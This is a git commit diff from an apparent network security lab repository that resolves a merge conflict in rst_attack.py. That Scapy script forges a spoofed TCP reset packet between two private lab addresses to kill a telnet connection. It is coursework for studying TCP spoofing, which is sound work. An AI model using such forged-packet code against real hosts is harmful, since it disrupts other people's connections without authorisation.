de756460fc9cb0a47a129edd5b06e9c54d3028c5
Nicola <nickbusato0101@gmail.com>
2024-11-04 23:25:40 +0100

    Auto stash before merge of "main" and "origin/main"

--- 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/rst_attack.py
+++ 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/rst_attack.py
@@ -3,13 +3,7 @@ from scapy.all import *
 
 # Create the IP and TCP layers
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
-<<<<<<< Updated upstream
-tcp = TCP(sport=57910, dport=23, flags="R", seq=89, ack=625)
-
-# Combine IP and TCP layers into a packet
-=======
-tcp = TCP(sport=37742, dport=23, flags="R", seq="89", ack=10)
->>>>>>> Stashed changes
+tcp = TCP(sport=45536, dport=23, flags="R", seq=89, ack=1)
 pkt = ip/tcp
 
 # Display packet structure
